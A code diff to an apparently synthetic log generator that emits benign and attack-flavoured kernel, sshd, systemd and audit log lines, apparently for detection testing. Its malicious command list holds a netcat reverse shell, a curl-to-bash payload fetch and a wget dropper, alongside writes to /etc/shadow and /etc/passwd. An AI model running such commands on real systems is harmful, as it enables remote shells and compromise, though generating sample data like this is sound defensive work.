@@ -3,16 +3,15 @@ from utils import (
     random_ip,
     random_user,
     timestamp_syslog,
-    timestamp_epoch
+    timestamp_epoch,
+    is_attack_wave
 )
 
 HOSTNAME = ["server01", "server02", "web01", "db01", "laptop01", "laptop04"]
-GOOD_RATIO = 0.65
 
 
-def kernel_log():
-    messages = [
-        # benign
+def kernel_log(malicious=False):
+    benign = [
         "eth0: link up",
         "eth0: link down",
         "CPU frequency scaling enabled",
@@ -20,69 +19,54 @@ def kernel_log():
         "USB device connected",
         "Bluetooth: hci0 device initialized",
         "systemd-journald started",
-
-        # warnings / critical
+    ]
+    malicious_msgs = [
         "EXT4-fs error (device sda1)",
         "Kernel panic - not syncing",
         "Out of memory: Kill process",
         "thermal throttling activated",
         "watchdog: BUG: soft lockup"
     ]
-
-    return (
-        f"{timestamp_syslog()} {random.choice(HOSTNAME)} kernel: "
-        f"{random.choice(messages)}"
-    )
+    msg = random.choice(malicious_msgs if malicious else benign)
+    return f"{timestamp_syslog()} {random.choice(HOSTNAME)} kernel: {msg}"
 
 
-def auth_log(context):
+def auth_log(malicious=False):
     methods = ["password", "publickey", "keyboard-interactive"]
     pid = random.randint(1000, 9000)
     port = random.randint(1024, 65535)
+    user = random_user()
+    ip = random_ip()
 
-    if context["malicious"]:
+    if malicious:
         return (
             f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
-            f"Failed {random.choice(methods)} for {context['user']} "
-            f"from {context['ip']} port {port}"
+            f"Failed {random.choice(methods)} for {user} "
+            f"from {ip} port {port}"
         )
-
     return (
         f"{timestamp_syslog()} {random.choice(HOSTNAME)} sshd[{pid}]: "
-        f"Accepted {random.choice(methods)} for {context['user']} "
-        f"from {context['ip']} port {port}"
+        f"Accepted {random.choice(methods)} for {user} "
+        f"from {ip} port {port}"
     )
 
 
-def service_log():
+def service_log(malicious=False):
     services = [
-        "nginx",
-        "apache2",
-        "mysql",
-        "docker",
-        "ssh",
-        "cron",
-        "rsyslog",
-        "network-manager",
-        "postfix"
+        "nginx", "apache2", "mysql", "docker",
+        "ssh", "cron", "rsyslog", "network-manager", "postfix"
     ]
+    benign_actions = ["Started", "Stopped", "Restarted", "Reloaded", "Scheduled restart job"]
+    malicious_actions = ["Failed", "Stopped", "Killed"]
 
-    actions = [
-        "Started",
-        "Stopped",
-        "Restarted",
-        "Reloaded",
-        "Failed",
-        "Scheduled restart job"
-    ]
-
+    action = random.choice(malicious_actions if malicious else benign_actions)
     return (
         f"{timestamp_syslog()} {random.choice(HOSTNAME)} systemd[1]: "
-        f"{random.choice(actions)} {random.choice(services)}.service"
+        f"{action} {random.choice(services)}.service"
     )
 
 
-def process_log(context):
+def process_log(malicious=False):
     benign_cmds = [
         "python app.py",
         "curl http://example.com",
@@ -92,23 +76,20 @@ def process_log(context):
         "df -h",
         "uptime"
     ]
-
     malicious_cmds = [
         "nc -e /bin/sh 10.0.0.1 4444",
         "curl http://malicious.site/payload.sh | bash",
         "wget http://bad.site/dropper -O /tmp/a && chmod +x /tmp/a",
         "python -c 'import socket,os,pty'"
     ]
-
-    cmd = random.choice(malicious_cmds if context["malicious"] else benign_cmds)
-
+    cmd = random.choice(malicious_cmds if malicious else benign_cmds)
     return (
         f"type=EXECVE msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
-        f"user={context['user']} cmd=\"{cmd}\""
+        f"user={random_user()} cmd=\"{cmd}\""
     )
 
 
-def filesystem_log(context):
+def filesystem_log(malicious=False):
     benign_paths = [
         "/var/log/syslog",
         "/etc/hosts",
@@ -117,7 +98,6 @@ def filesystem_log(context):
         "/home/user1/.bashrc",
         "/opt/app/config.yaml"
     ]
-
     malicious_paths = [
         "/etc/shadow",
         "/etc/passwd",
@@ -126,34 +106,23 @@ def filesystem_log(context):
         "/dev/shm/payload",
         "/var/tmp/.x"
     ]
-
-    if context["malicious"]:
-        return (
-            f"type=PATH msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
-            f"name=\"{random.choice(malicious_paths)}\" perm=\"w\" "
-            f"user={context['user']}"
-        )
-
+    path = random.choice(malicious_paths if malicious else benign_paths)
+    perm = "w" if malicious else "r"
     return (
         f"type=PATH msg=audit({timestamp_epoch()}:{random.randint(100,999)}): "
-        f"name=\"{random.choice(benign_paths)}\" perm=\"r\" "
-        f"user={context['user']}"
+        f"name=\"{path}\" perm=\"{perm}\" user={random_user()}"
     )
 
 
 def generate():
-    context = {
-        "ip": random_ip(),
-        "user": random_user(),
-        "malicious": random.random() > GOOD_RATIO
-    }
+    malicious = is_attack_wave()
 
     generators = [
-        kernel_log,
-        lambda: auth_log(context),
-        service_log,
-        lambda: process_log(context),
-        lambda: filesystem_log(context)
+        lambda: kernel_log(malicious),
+        lambda: auth_log(malicious),
+        lambda: service_log(malicious),
+        lambda: process_log(malicious),
+        lambda: filesystem_log(malicious),
     ]
 
     return random.choice(generators)()
